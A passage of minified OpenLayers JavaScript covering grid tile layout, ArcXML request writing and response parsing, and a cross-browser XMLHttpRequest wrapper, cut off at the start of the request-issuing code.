this._transitionElement}this.backBuffer&&\n(this.backBuffer.parentNode&&this.backBuffer.parentNode.removeChild(this.backBuffer),this.backBufferResolution=this.backBuffer=null,null!==this.backBufferTimerId&&(window.clearTimeout(this.backBufferTimerId),this.backBufferTimerId=null))},moveByPx:function(a,b){this.singleTile||this.moveGriddedTiles()},setTileSize:function(a){this.singleTile&&(a=this.map.getSize(),a.h=parseInt(a.h*this.ratio,10),a.w=parseInt(a.w*this.ratio,10));OpenLayers.Layer.HTTPRequest.prototype.setTileSize.apply(this,[a])},getTilesBounds:function(){var a=\nnull,b=this.grid.length;if(b)var a=this.grid[b-1][0].bounds,b=this.grid[0].length*a.getWidth(),c=this.grid.length*a.getHeight(),a=new OpenLayers.Bounds(a.left,a.bottom,a.left+b,a.bottom+c);return a},initSingleTile:function(a){this.events.triggerEvent(\"retile\");var b=a.getCenterLonLat(),c=a.getWidth()*this.ratio;a=a.getHeight()*this.ratio;b=new OpenLayers.Bounds(b.lon-c/2,b.lat-a/2,b.lon+c/2,b.lat+a/2);c=this.map.getLayerPxFromLonLat({lon:b.left,lat:b.top});this.grid.length||(this.grid[0]=[]);(a=this.grid[0][0])?\na.moveTo(b,c):(a=this.addTile(b,c),this.addTileMonitoringHooks(a),a.draw(),this.grid[0][0]=a);this.removeExcessTiles(1,1);this.gridResolution=this.getServerResolution()},calculateGridLayout:function(a,b,c){var d=c*this.tileSize.w;c*=this.tileSize.h;var e=Math.floor((a.left-b.lon)/d)-this.buffer,f=this.rowSign;a=Math[~f?\"floor\":\"ceil\"](f*(b.lat-a.top+c)/c)-this.buffer*f;return{tilelon:d,tilelat:c,startcol:e,startrow:a}},getTileOrigin:function(){var a=this.tileOrigin;if(!a)var a=this.getMaxExtent(),\nb={tl:[\"left\",\"top\"],tr:[\"right\",\"top\"],bl:[\"left\",\"bottom\"],br:[\"right\",\"bottom\"]}[this.tileOriginCorner],a=new OpenLayers.LonLat(a[b[0]],a[b[1]]);return a},getTileBoundsForGridIndex:function(a,b){var c=this.getTileOrigin(),d=this.gridLayout,e=d.tilelon,f=d.tilelat,g=d.startcol,d=d.startrow,h=this.rowSign;return new OpenLayers.Bounds(c.lon+(g+b)*e,c.lat-(d+a*h)*f*h,c.lon+(g+b+1)*e,c.lat-(d+(a-1)*h)*f*h)},initGriddedTiles:function(a){this.events.triggerEvent(\"retile\");var b=this.map.getSize(),c=this.getTileOrigin(),\nd=this.map.getResolution(),e=this.getServerResolution(),f=d/e,d=this.tileSize.w/f,f=this.tileSize.h/f,g=Math.ceil(b.h/f)+2*this.buffer+1,b=Math.ceil(b.w/d)+2*this.buffer+1;this.gridLayout=e=this.calculateGridLayout(a,c,e);var c=e.tilelon,h=e.tilelat,e=this.map.layerContainerOriginPx.x,k=this.map.layerContainerOriginPx.y,l=this.getTileBoundsForGridIndex(0,0),m=this.map.getViewPortPxFromLonLat(new OpenLayers.LonLat(l.left,l.top));m.x=Math.round(m.x)-e;m.y=Math.round(m.y)-k;var e=[],k=this.map.getCenter(),\nn=0;do{var p=this.grid[n];p||(p=[],this.grid.push(p));var q=0;do{var l=this.getTileBoundsForGridIndex(n,q),r=m.clone();r.x+=q*Math.round(d);r.y+=n*Math.round(f);var s=p[q];s?s.moveTo(l,r,!1):(s=this.addTile(l,r),this.addTileMonitoringHooks(s),p.push(s));r=l.getCenterLonLat();e.push({tile:s,distance:Math.pow(r.lon-k.lon,2)+Math.pow(r.lat-k.lat,2)});q+=1}while(l.right<=a.right+c*this.buffer||q<b);n+=1}while(l.bottom>=a.bottom-h*this.buffer||n<g);this.removeExcessTiles(n,q);this.gridResolution=d=this.getServerResolution();\ne.sort(function(a,b){return a.distance-b.distance});a=0;for(d=e.length;a<d;++a)e[a].tile.draw()},getMaxExtent:function(){return this.maxExtent},addTile:function(a,b){var c=new this.tileClass(this,b,a,null,this.tileSize,this.tileOptions);this.events.triggerEvent(\"addtile\",{tile:c});return c},addTileMonitoringHooks:function(a){a.onLoadStart=function(){!1===this.loading&&(this.loading=!0,this.events.triggerEvent(\"loadstart\"));this.events.triggerEvent(\"tileloadstart\",{tile:a});this.numLoadingTiles++;\n!this.singleTile&&(this.backBuffer&&this.gridResolution===this.backBufferResolution)&&OpenLayers.Element.addClass(a.getTile(),\"olTileReplacing\")};a.onLoadEnd=function(b){this.numLoadingTiles--;b=\"unload\"===b.type;this.events.triggerEvent(\"tileloaded\",{tile:a,aborted:b});if(!this.singleTile&&!b&&this.backBuffer&&this.gridResolution===this.backBufferResolution){var c=a.getTile();if(\"none\"===OpenLayers.Element.getStyle(c,\"display\")){var d=document.getElementById(a.id+\"_bb\");d&&d.parentNode.removeChild(d)}OpenLayers.Element.removeClass(c,\n\"olTileReplacing\")}if(0===this.numLoadingTiles){if(this.backBuffer)if(0===this.backBuffer.childNodes.length)this.removeBackBuffer();else{this._transitionElement=b?this.div.lastChild:a.imgDiv;b=this.transitionendEvents;for(c=b.length-1;0<=c;--c)OpenLayers.Event.observe(this._transitionElement,b[c],this._removeBackBuffer);this.backBufferTimerId=window.setTimeout(this._removeBackBuffer,this.removeBackBufferDelay)}this.loading=!1;this.events.triggerEvent(\"loadend\")}};a.onLoadError=function(){this.events.triggerEvent(\"tileerror\",\n{tile:a})};a.events.on({loadstart:a.onLoadStart,loadend:a.onLoadEnd,unload:a.onLoadEnd,loaderror:a.onLoadError,scope:this})},removeTileMonitoringHooks:function(a){a.unload();a.events.un({loadstart:a.onLoadStart,loadend:a.onLoadEnd,unload:a.onLoadEnd,loaderror:a.onLoadError,scope:this})},moveGriddedTiles:function(){for(var a=this.buffer+1;;){var b=this.grid[0][0],c=b.position.x+this.map.layerContainerOriginPx.x,b=b.position.y+this.map.layerContainerOriginPx.y,d=this.getServerResolution()/this.map.getResolution(),\nd={w:Math.round(this.tileSize.w*d),h:Math.round(this.tileSize.h*d)};if(c>-d.w*(a-1))this.shiftColumn(!0,d);else if(c<-d.w*a)this.shiftColumn(!1,d);else if(b>-d.h*(a-1))this.shiftRow(!0,d);else if(b<-d.h*a)this.shiftRow(!1,d);else break}},shiftRow:function(a,b){var c=this.grid,d=a?0:c.length-1,e=a?-1:1;this.gridLayout.startrow+=e*this.rowSign;for(var f=c[d],g=c[a?\"pop\":\"shift\"](),h=0,k=g.length;h<k;h++){var l=g[h],m=f[h].position.clone();m.y+=b.h*e;l.moveTo(this.getTileBoundsForGridIndex(d,h),m)}c[a?\n\"unshift\":\"push\"](g)},shiftColumn:function(a,b){var c=this.grid,d=a?0:c[0].length-1,e=a?-1:1;this.gridLayout.startcol+=e;for(var f=0,g=c.length;f<g;f++){var h=c[f],k=h[d].position.clone(),l=h[a?\"pop\":\"shift\"]();k.x+=b.w*e;l.moveTo(this.getTileBoundsForGridIndex(f,d),k);h[a?\"unshift\":\"push\"](l)}},removeExcessTiles:function(a,b){for(var c,d;this.grid.length>a;){var e=this.grid.pop();c=0;for(d=e.length;c<d;c++){var f=e[c];this.destroyTile(f)}}c=0;for(d=this.grid.length;c<d;c++)for(;this.grid[c].length>\nb;)e=this.grid[c],f=e.pop(),this.destroyTile(f)},onMapResize:function(){this.singleTile&&(this.clearGrid(),this.setTileSize())},getTileBounds:function(a){var b=this.maxExtent,c=this.getResolution(),d=c*this.tileSize.w,c=c*this.tileSize.h,e=this.getLonLatFromViewPortPx(a);a=b.left+d*Math.floor((e.lon-b.left)/d);b=b.bottom+c*Math.floor((e.lat-b.bottom)/c);return new OpenLayers.Bounds(a,b,a+d,b+c)},CLASS_NAME:\"OpenLayers.Layer.Grid\"});OpenLayers.Format.ArcXML=OpenLayers.Class(OpenLayers.Format.XML,{fontStyleKeys:\"antialiasing blockout font fontcolor fontsize fontstyle glowing interval outline printmode shadow transparency\".split(\" \"),request:null,response:null,initialize:function(a){this.request=new OpenLayers.Format.ArcXML.Request;this.response=new OpenLayers.Format.ArcXML.Response;if(a)if(\"feature\"==a.requesttype){this.request.get_image=null;var b=this.request.get_feature.query;this.addCoordSys(b.featurecoordsys,a.featureCoordSys);\nthis.addCoordSys(b.filtercoordsys,a.filterCoordSys);a.polygon?(b.isspatial=!0,b.spatialfilter.polygon=a.polygon):a.envelope&&(b.isspatial=!0,b.spatialfilter.envelope={minx:0,miny:0,maxx:0,maxy:0},this.parseEnvelope(b.spatialfilter.envelope,a.envelope))}else\"image\"==a.requesttype?(this.request.get_feature=null,b=this.request.get_image.properties,this.parseEnvelope(b.envelope,a.envelope),this.addLayers(b.layerlist,a.layers),this.addImageSize(b.imagesize,a.tileSize),this.addCoordSys(b.featurecoordsys,\na.featureCoordSys),this.addCoordSys(b.filtercoordsys,a.filterCoordSys)):this.request=null;OpenLayers.Format.XML.prototype.initialize.apply(this,[a])},parseEnvelope:function(a,b){b&&4==b.length&&(a.minx=b[0],a.miny=b[1],a.maxx=b[2],a.maxy=b[3])},addLayers:function(a,b){for(var c=0,d=b.length;c<d;c++)a.push(b[c])},addImageSize:function(a,b){null!==b&&(a.width=b.w,a.height=b.h,a.printwidth=b.w,a.printheight=b.h)},addCoordSys:function(a,b){\"string\"==typeof b?(a.id=parseInt(b),a.string=b):\"object\"==typeof b&&\nnull!==b.proj&&(a.id=b.proj.srsProjNumber,a.string=b.proj.srsCode)},iserror:function(a){var b=null;a?(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]),a=a.documentElement.getElementsByTagName(\"ERROR\"),b=null!==a&&0<a.length):b=\"\"!==this.response.error;return b},read:function(a){\"string\"==typeof a&&(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));var b=null;a&&a.documentElement&&(b=\"ARCXML\"==a.documentElement.nodeName?a.documentElement:a.documentElement.getElementsByTagName(\"ARCXML\")[0]);\nif(!b||\"parsererror\"===b.firstChild.nodeName){var c,d;try{c=a.firstChild.nodeValue,d=a.firstChild.childNodes[1].firstChild.nodeValue}catch(e){}throw{message:\"Error parsing the ArcXML request\",error:c,source:d};}return this.parseResponse(b)},write:function(a){a||(a=this.request);var b=this.createElementNS(\"\",\"ARCXML\");b.setAttribute(\"version\",\"1.1\");var c=this.createElementNS(\"\",\"REQUEST\");if(null!=a.get_image){var d=this.createElementNS(\"\",\"GET_IMAGE\");c.appendChild(d);var e=this.createElementNS(\"\",\n\"PROPERTIES\");d.appendChild(e);a=a.get_image.properties;null!=a.featurecoordsys&&(d=this.createElementNS(\"\",\"FEATURECOORDSYS\"),e.appendChild(d),0===a.featurecoordsys.id?d.setAttribute(\"string\",a.featurecoordsys.string):d.setAttribute(\"id\",a.featurecoordsys.id));null!=a.filtercoordsys&&(d=this.createElementNS(\"\",\"FILTERCOORDSYS\"),e.appendChild(d),0===a.filtercoordsys.id?d.setAttribute(\"string\",a.filtercoordsys.string):d.setAttribute(\"id\",a.filtercoordsys.id));null!=a.envelope&&(d=this.createElementNS(\"\",\n\"ENVELOPE\"),e.appendChild(d),d.setAttribute(\"minx\",a.envelope.minx),d.setAttribute(\"miny\",a.envelope.miny),d.setAttribute(\"maxx\",a.envelope.maxx),d.setAttribute(\"maxy\",a.envelope.maxy));d=this.createElementNS(\"\",\"IMAGESIZE\");e.appendChild(d);d.setAttribute(\"height\",a.imagesize.height);d.setAttribute(\"width\",a.imagesize.width);if(a.imagesize.height!=a.imagesize.printheight||a.imagesize.width!=a.imagesize.printwidth)d.setAttribute(\"printheight\",a.imagesize.printheight),d.setArrtibute(\"printwidth\",a.imagesize.printwidth);\nnull!=a.background&&(d=this.createElementNS(\"\",\"BACKGROUND\"),e.appendChild(d),d.setAttribute(\"color\",a.background.color.r+\",\"+a.background.color.g+\",\"+a.background.color.b),null!==a.background.transcolor&&d.setAttribute(\"transcolor\",a.background.transcolor.r+\",\"+a.background.transcolor.g+\",\"+a.background.transcolor.b));if(null!=a.layerlist&&0<a.layerlist.length)for(d=this.createElementNS(\"\",\"LAYERLIST\"),e.appendChild(d),e=0;e<a.layerlist.length;e++){var f=this.createElementNS(\"\",\"LAYERDEF\");d.appendChild(f);\nf.setAttribute(\"id\",a.layerlist[e].id);f.setAttribute(\"visible\",a.layerlist[e].visible);if(\"object\"==typeof a.layerlist[e].query){var g=a.layerlist[e].query;if(0>g.where.length)continue;var h=null,h=\"boolean\"==typeof g.spatialfilter&&g.spatialfilter?this.createElementNS(\"\",\"SPATIALQUERY\"):this.createElementNS(\"\",\"QUERY\");h.setAttribute(\"where\",g.where);\"number\"==typeof g.accuracy&&0<g.accuracy&&h.setAttribute(\"accuracy\",g.accuracy);\"number\"==typeof g.featurelimit&&2E3>g.featurelimit&&h.setAttribute(\"featurelimit\",\ng.featurelimit);\"string\"==typeof g.subfields&&\"#ALL#\"!=g.subfields&&h.setAttribute(\"subfields\",g.subfields);\"string\"==typeof g.joinexpression&&0<g.joinexpression.length&&h.setAttribute(\"joinexpression\",g.joinexpression);\"string\"==typeof g.jointables&&0<g.jointables.length&&h.setAttribute(\"jointables\",g.jointables);f.appendChild(h)}\"object\"==typeof a.layerlist[e].renderer&&this.addRenderer(f,a.layerlist[e].renderer)}}else null!=a.get_feature&&(d=this.createElementNS(\"\",\"GET_FEATURES\"),d.setAttribute(\"outputmode\",\n\"newxml\"),d.setAttribute(\"checkesc\",\"true\"),a.get_feature.geometry?d.setAttribute(\"geometry\",a.get_feature.geometry):d.setAttribute(\"geometry\",\"false\"),a.get_feature.compact&&d.setAttribute(\"compact\",a.get_feature.compact),\"number\"==a.get_feature.featurelimit&&d.setAttribute(\"featurelimit\",a.get_feature.featurelimit),d.setAttribute(\"globalenvelope\",\"true\"),c.appendChild(d),null!=a.get_feature.layer&&0<a.get_feature.layer.length&&(e=this.createElementNS(\"\",\"LAYER\"),e.setAttribute(\"id\",a.get_feature.layer),\nd.appendChild(e)),a=a.get_feature.query,null!=a&&(e=null,e=a.isspatial?this.createElementNS(\"\",\"SPATIALQUERY\"):this.createElementNS(\"\",\"QUERY\"),d.appendChild(e),\"number\"==typeof a.accuracy&&e.setAttribute(\"accuracy\",a.accuracy),null!=a.featurecoordsys&&(d=this.createElementNS(\"\",\"FEATURECOORDSYS\"),0==a.featurecoordsys.id?d.setAttribute(\"string\",a.featurecoordsys.string):d.setAttribute(\"id\",a.featurecoordsys.id),e.appendChild(d)),null!=a.filtercoordsys&&(d=this.createElementNS(\"\",\"FILTERCOORDSYS\"),\n0===a.filtercoordsys.id?d.setAttribute(\"string\",a.filtercoordsys.string):d.setAttribute(\"id\",a.filtercoordsys.id),e.appendChild(d)),0<a.buffer&&(d=this.createElementNS(\"\",\"BUFFER\"),d.setAttribute(\"distance\",a.buffer),e.appendChild(d)),a.isspatial&&(d=this.createElementNS(\"\",\"SPATIALFILTER\"),d.setAttribute(\"relation\",a.spatialfilter.relation),e.appendChild(d),a.spatialfilter.envelope?(f=this.createElementNS(\"\",\"ENVELOPE\"),f.setAttribute(\"minx\",a.spatialfilter.envelope.minx),f.setAttribute(\"miny\",a.spatialfilter.envelope.miny),\nf.setAttribute(\"maxx\",a.spatialfilter.envelope.maxx),f.setAttribute(\"maxy\",a.spatialfilter.envelope.maxy),d.appendChild(f)):\"object\"==typeof a.spatialfilter.polygon&&d.appendChild(this.writePolygonGeometry(a.spatialfilter.polygon))),null!=a.where&&0<a.where.length&&e.setAttribute(\"where\",a.where)));b.appendChild(c);return OpenLayers.Format.XML.prototype.write.apply(this,[b])},addGroupRenderer:function(a,b){var c=this.createElementNS(\"\",\"GROUPRENDERER\");a.appendChild(c);for(var d=0;d<b.length;d++)this.addRenderer(c,\nb[d])},addRenderer:function(a,b){if(OpenLayers.Util.isArray(b))this.addGroupRenderer(a,b);else{var c=this.createElementNS(\"\",b.type.toUpperCase()+\"RENDERER\");a.appendChild(c);\"VALUEMAPRENDERER\"==c.tagName?this.addValueMapRenderer(c,b):\"VALUEMAPLABELRENDERER\"==c.tagName?this.addValueMapLabelRenderer(c,b):\"SIMPLELABELRENDERER\"==c.tagName?this.addSimpleLabelRenderer(c,b):\"SCALEDEPENDENTRENDERER\"==c.tagName&&this.addScaleDependentRenderer(c,b)}},addScaleDependentRenderer:function(a,b){\"string\"!=typeof b.lower&&\n\"number\"!=typeof b.lower||a.setAttribute(\"lower\",b.lower);\"string\"!=typeof b.upper&&\"number\"!=typeof b.upper||a.setAttribute(\"upper\",b.upper);this.addRenderer(a,b.renderer)},addValueMapLabelRenderer:function(a,b){a.setAttribute(\"lookupfield\",b.lookupfield);a.setAttribute(\"labelfield\",b.labelfield);if(\"object\"==typeof b.exacts)for(var c=0,d=b.exacts.length;c<d;c++){var e=b.exacts[c],f=this.createElementNS(\"\",\"EXACT\");\"string\"==typeof e.value&&f.setAttribute(\"value\",e.value);\"string\"==typeof e.label&&\nf.setAttribute(\"label\",e.label);\"string\"==typeof e.method&&f.setAttribute(\"method\",e.method);a.appendChild(f);if(\"object\"==typeof e.symbol){var g=null;\"text\"==e.symbol.type&&(g=this.createElementNS(\"\",\"TEXTSYMBOL\"));if(null!=g){for(var h=this.fontStyleKeys,k=0,l=h.length;k<l;k++){var m=h[k];e.symbol[m]&&g.setAttribute(m,e.symbol[m])}f.appendChild(g)}}}},addValueMapRenderer:function(a,b){a.setAttribute(\"lookupfield\",b.lookupfield);if(\"object\"==typeof b.ranges)for(var c=0,d=b.ranges.length;c<d;c++){var e=\nb.ranges[c],f=this.createElementNS(\"\",\"RANGE\");f.setAttribute(\"lower\",e.lower);f.setAttribute(\"upper\",e.upper);a.appendChild(f);if(\"object\"==typeof e.symbol){var g=null;\"simplepolygon\"==e.symbol.type&&(g=this.createElementNS(\"\",\"SIMPLEPOLYGONSYMBOL\"));null!=g&&(\"string\"==typeof e.symbol.boundarycolor&&g.setAttribute(\"boundarycolor\",e.symbol.boundarycolor),\"string\"==typeof e.symbol.fillcolor&&g.setAttribute(\"fillcolor\",e.symbol.fillcolor),\"number\"==typeof e.symbol.filltransparency&&g.setAttribute(\"filltransparency\",\ne.symbol.filltransparency),f.appendChild(g))}}else if(\"object\"==typeof b.exacts)for(c=0,d=b.exacts.length;c<d;c++)e=b.exacts[c],f=this.createElementNS(\"\",\"EXACT\"),\"string\"==typeof e.value&&f.setAttribute(\"value\",e.value),\"string\"==typeof e.label&&f.setAttribute(\"label\",e.label),\"string\"==typeof e.method&&f.setAttribute(\"method\",e.method),a.appendChild(f),\"object\"==typeof e.symbol&&(g=null,\"simplemarker\"==e.symbol.type&&(g=this.createElementNS(\"\",\"SIMPLEMARKERSYMBOL\")),null!=g&&(\"string\"==typeof e.symbol.antialiasing&&\ng.setAttribute(\"antialiasing\",e.symbol.antialiasing),\"string\"==typeof e.symbol.color&&g.setAttribute(\"color\",e.symbol.color),\"string\"==typeof e.symbol.outline&&g.setAttribute(\"outline\",e.symbol.outline),\"string\"==typeof e.symbol.overlap&&g.setAttribute(\"overlap\",e.symbol.overlap),\"string\"==typeof e.symbol.shadow&&g.setAttribute(\"shadow\",e.symbol.shadow),\"number\"==typeof e.symbol.transparency&&g.setAttribute(\"transparency\",e.symbol.transparency),\"string\"==typeof e.symbol.usecentroid&&g.setAttribute(\"usecentroid\",\ne.symbol.usecentroid),\"number\"==typeof e.symbol.width&&g.setAttribute(\"width\",e.symbol.width),f.appendChild(g)))},addSimpleLabelRenderer:function(a,b){a.setAttribute(\"field\",b.field);for(var c=\"featureweight howmanylabels labelbufferratio labelpriorities labelweight linelabelposition rotationalangles\".split(\" \"),d=0,e=c.length;d<e;d++){var f=c[d];b[f]&&a.setAttribute(f,b[f])}if(\"text\"==b.symbol.type){var g=b.symbol,h=this.createElementNS(\"\",\"TEXTSYMBOL\");a.appendChild(h);c=this.fontStyleKeys;d=0;\nfor(e=c.length;d<e;d++)f=c[d],g[f]&&h.setAttribute(f,b[f])}},writePolygonGeometry:function(a){if(!(a instanceof OpenLayers.Geometry.Polygon))throw{message:\"Cannot write polygon geometry to ArcXML with an \"+a.CLASS_NAME+\" object.\",geometry:a};for(var b=this.createElementNS(\"\",\"POLYGON\"),c=0,d=a.components.length;c<d;c++){for(var e=a.components[c],f=this.createElementNS(\"\",\"RING\"),g=0,h=e.components.length;g<h;g++){var k=e.components[g],l=this.createElementNS(\"\",\"POINT\");l.setAttribute(\"x\",k.x);l.setAttribute(\"y\",\nk.y);f.appendChild(l)}b.appendChild(f)}return b},parseResponse:function(a){\"string\"==typeof a&&(a=(new OpenLayers.Format.XML).read(a));var b=new OpenLayers.Format.ArcXML.Response,c=a.getElementsByTagName(\"ERROR\");if(null!=c&&0<c.length)b.error=this.getChildValue(c,\"Unknown error.\");else{c=a.getElementsByTagName(\"RESPONSE\");if(null==c||0==c.length)return b.error=\"No RESPONSE tag found in ArcXML response.\",b;var d=c[0].firstChild.nodeName;\"#text\"==d&&(d=c[0].firstChild.nextSibling.nodeName);if(\"IMAGE\"==\nd)c=a.getElementsByTagName(\"ENVELOPE\"),a=a.getElementsByTagName(\"OUTPUT\"),null==c||0==c.length?b.error=\"No ENVELOPE tag found in ArcXML response.\":null==a||0==a.length?b.error=\"No OUTPUT tag found in ArcXML response.\":(c=this.parseAttributes(c[0]),d=this.parseAttributes(a[0]),b.image=\"string\"==typeof d.type?{envelope:c,output:{type:d.type,data:this.getChildValue(a[0])}}:{envelope:c,output:d});else if(\"FEATURES\"==d){if(a=c[0].getElementsByTagName(\"FEATURES\"),c=a[0].getElementsByTagName(\"FEATURECOUNT\"),\nb.features.featurecount=c[0].getAttribute(\"count\"),0<b.features.featurecount)for(c=a[0].getElementsByTagName(\"ENVELOPE\"),b.features.envelope=this.parseAttributes(c[0],\"number\"),a=a[0].getElementsByTagName(\"FEATURE\"),c=0;c<a.length;c++){for(var d=new OpenLayers.Feature.Vector,e=a[c].getElementsByTagName(\"FIELD\"),f=0;f<e.length;f++){var g=e[f].getAttribute(\"name\"),h=e[f].getAttribute(\"value\");d.attributes[g]=h}e=a[c].getElementsByTagName(\"POLYGON\");if(0<e.length){e=e[0].getElementsByTagName(\"RING\");\nf=[];for(g=0;g<e.length;g++){h=[];h.push(this.parsePointGeometry(e[g]));for(var k=e[g].getElementsByTagName(\"HOLE\"),l=0;l<k.length;l++)h.push(this.parsePointGeometry(k[l]));f.push(new OpenLayers.Geometry.Polygon(h))}d.geometry=1==f.length?f[0]:new OpenLayers.Geometry.MultiPolygon(f)}b.features.feature.push(d)}}else b.error=\"Unidentified response type.\"}return b},parseAttributes:function(a,b){for(var c={},d=0;d<a.attributes.length;d++)c[a.attributes[d].nodeName]=\"number\"==b?parseFloat(a.attributes[d].nodeValue):\na.attributes[d].nodeValue;return c},parsePointGeometry:function(a){var b=[],c=a.getElementsByTagName(\"COORDS\");if(0<c.length)for(a=this.getChildValue(c[0]),a=a.split(/;/),c=0;c<a.length;c++){var d=a[c].split(/ /);b.push(new OpenLayers.Geometry.Point(d[0],d[1]))}else if(a=a.getElementsByTagName(\"POINT\"),0<a.length)for(c=0;c<a.length;c++)b.push(new OpenLayers.Geometry.Point(parseFloat(a[c].getAttribute(\"x\")),parseFloat(a[c].getAttribute(\"y\"))));return new OpenLayers.Geometry.LinearRing(b)},CLASS_NAME:\"OpenLayers.Format.ArcXML\"});\nOpenLayers.Format.ArcXML.Request=OpenLayers.Class({initialize:function(a){return OpenLayers.Util.extend(this,{get_image:{properties:{background:null,draw:!0,envelope:{minx:0,miny:0,maxx:0,maxy:0},featurecoordsys:{id:0,string:\"\",datumtransformid:0,datumtransformstring:\"\"},filtercoordsys:{id:0,string:\"\",datumtransformid:0,datumtransformstring:\"\"},imagesize:{height:0,width:0,dpi:96,printheight:0,printwidth:0,scalesymbols:!1},layerlist:[],output:{baseurl:\"\",legendbaseurl:\"\",legendname:\"\",legendpath:\"\",\nlegendurl:\"\",name:\"\",path:\"\",type:\"jpg\",url:\"\"}}},get_feature:{layer:\"\",query:{isspatial:!1,featurecoordsys:{id:0,string:\"\",datumtransformid:0,datumtransformstring:\"\"},filtercoordsys:{id:0,string:\"\",datumtransformid:0,datumtransformstring:\"\"},buffer:0,where:\"\",spatialfilter:{relation:\"envelope_intersection\",envelope:null}}},environment:{separators:{cs:\" \",ts:\";\"}},layer:[],workspaces:[]})},CLASS_NAME:\"OpenLayers.Format.ArcXML.Request\"});\nOpenLayers.Format.ArcXML.Response=OpenLayers.Class({initialize:function(a){return OpenLayers.Util.extend(this,{image:{envelope:null,output:\"\"},features:{featurecount:0,envelope:null,feature:[]},error:\"\"})},CLASS_NAME:\"OpenLayers.Format.ArcXML.Response\"});(function(){function a(){this._object=f&&!k?new f:new window.ActiveXObject(\"Microsoft.XMLHTTP\");this._listeners=[]}function b(){return new a}function c(a){b.onreadystatechange&&b.onreadystatechange.apply(a);a.dispatchEvent({type:\"readystatechange\",bubbles:!1,cancelable:!1,timeStamp:new Date+0})}function d(a){try{a.responseText=a._object.responseText}catch(b){}try{var c;var d=a._object,e=d.responseXML,f=d.responseText;h&&(f&&e&&!e.documentElement&&d.getResponseHeader(\"Content-Type\").match(/[^\\/]+\\/[^\\+]+\\+xml/))&&\n(e=new window.ActiveXObject(\"Microsoft.XMLDOM\"),e.async=!1,e.validateOnParse=!1,e.loadXML(f));c=e&&(h&&0!=e.parseError||!e.documentElement||e.documentElement&&\"parsererror\"==e.documentElement.tagName)?null:e;a.responseXML=c}catch(g){}try{a.status=a._object.status}catch(k){}try{a.statusText=a._object.statusText}catch(u){}}function e(a){a._object.onreadystatechange=new window.Function}var f=window.XMLHttpRequest,g=!!window.controllers,h=window.document.all&&!window.opera,k=h&&window.navigator.userAgent.match(/MSIE 7.0/);\nb.prototype=a.prototype;g&&f.wrapped&&(b.wrapped=f.wrapped);b.UNSENT=0;b.OPENED=1;b.HEADERS_RECEIVED=2;b.LOADING=3;b.DONE=4;b.prototype.readyState=b.UNSENT;b.prototype.responseText=\"\";b.prototype.responseXML=null;b.prototype.status=0;b.prototype.statusText=\"\";b.prototype.priority=\"NORMAL\";b.prototype.onreadystatechange=null;b.onreadystatechange=null;b.onopen=null;b.onsend=null;b.onabort=null;b.prototype.open=function(a,f,k,p,q){delete this._headers;3>arguments.length&&(k=!0);this._async=k;var r=this,\ns=this.readyState,t;h&&k&&(t=function(){s!=b.DONE&&(e(r),r.abort())},window.attachEvent(\"onunload\",t));b.onopen&&b.onopen.apply(this,arguments);4<arguments.length?this._object.open(a,f,k,p,q):3<arguments.length?this._object.open(a,f,k,p):this._object.open(a,f,k);this.readyState=b.OPENED;c(this);this._object.onreadystatechange=function(){if(!g||k)r.readyState=r._object.readyState,d(r),r._aborted?r.readyState=b.UNSENT:(r.readyState==b.DONE&&(delete r._data,e(r),h&&k&&window.detachEvent(\"onunload\",t)),\ns!=r.readyState&&c(r),s=r.readyState)}};b.prototype.send=function(a){b.onsend&&b.onsend.apply(this,arguments);arguments.length||(a=null);a&&a.nodeType&&(a=window.XMLSerializer?(new window.XMLSerializer).serializeToString(a):a.xml,this._headers[\"Content-Type\"]||this._object.setRequestHeader(\"Content-Type\",\"application/xml\"));this._data=a;a:if(this._object.send(this._data),g&&!this._async)for(this.readyState=b.OPENED,d(this);this.readyState<b.DONE;)if(this.readyState++,c(this),this._aborted)break a};\nb.prototype.abort=function(){b.onabort&&b.onabort.apply(this,arguments);this.readyState>b.UNSENT&&(this._aborted=!0);this._object.abort();e(this);this.readyState=b.UNSENT;delete this._data};b.prototype.getAllResponseHeaders=function(){return this._object.getAllResponseHeaders()};b.prototype.getResponseHeader=function(a){return this._object.getResponseHeader(a)};b.prototype.setRequestHeader=function(a,b){this._headers||(this._headers={});this._headers[a]=b;return this._object.setRequestHeader(a,b)};\nb.prototype.addEventListener=function(a,b,c){for(var d=0,e;e=this._listeners[d];d++)if(e[0]==a&&e[1]==b&&e[2]==c)return;this._listeners.push([a,b,c])};b.prototype.removeEventListener=function(a,b,c){for(var d=0,e;(e=this._listeners[d])&&(e[0]!=a||e[1]!=b||e[2]!=c);d++);e&&this._listeners.splice(d,1)};b.prototype.dispatchEvent=function(a){a={type:a.type,target:this,currentTarget:this,eventPhase:2,bubbles:a.bubbles,cancelable:a.cancelable,timeStamp:a.timeStamp,stopPropagation:function(){},preventDefault:function(){},\ninitEvent:function(){}};\"readystatechange\"==a.type&&this.onreadystatechange&&(this.onreadystatechange.handleEvent||this.onreadystatechange).apply(this,[a]);for(var b=0,c;c=this._listeners[b];b++)c[0]!=a.type||c[2]||(c[1].handleEvent||c[1]).apply(this,[a])};b.prototype.toString=function(){return\"[object XMLHttpRequest]\"};b.toString=function(){return\"[XMLHttpRequest]\"};window.Function.prototype.apply||(window.Function.prototype.apply=function(a,b){b||(b=[]);a.__func=this;a.__func(b[0],b[1],b[2],b[3],\nb[4]);delete a.__func});OpenLayers.Request||(OpenLayers.Request={});OpenLayers.Request.XMLHttpRequest=b})();OpenLayers.ProxyHost=\"\";OpenLayers.Request||(OpenLayers.Request={});\nOpenLayers.Util.extend(OpenLayers.Request,{DEFAULT_CONFIG:{method:\"GET\",url:window.location.href,async:!0,user:void 0,password:void 0,params:null,proxy:OpenLayers.ProxyHost,headers:{},data:null,callback:function(){},success:null,failure:null,scope:null},URL_SPLIT_REGEX:/([^:]*:)\\/\\/([^:]*:?[^@]*@)?([^:\\/\\?]*):?([^\\/\\?]*)/,events:new OpenLayers.Events(this),makeSameOrigin:function(a,b){var c=0!==a.indexOf(\"http\"),d=!c&&a.match(this.URL_SPLIT_REGEX);if(d){var e=window.location,c=d[1]==e.protocol&&d[3]==\ne.hostname,d=d[4],e=e.port;if(80!=d&&\"\"!=d||\"80\"!=e&&\"\"!=e)c=c&&d==e}c||b&&(a=\"function\"==typeof b?b(a):b+encodeURIComponent(a));return a},issue:function(a){var 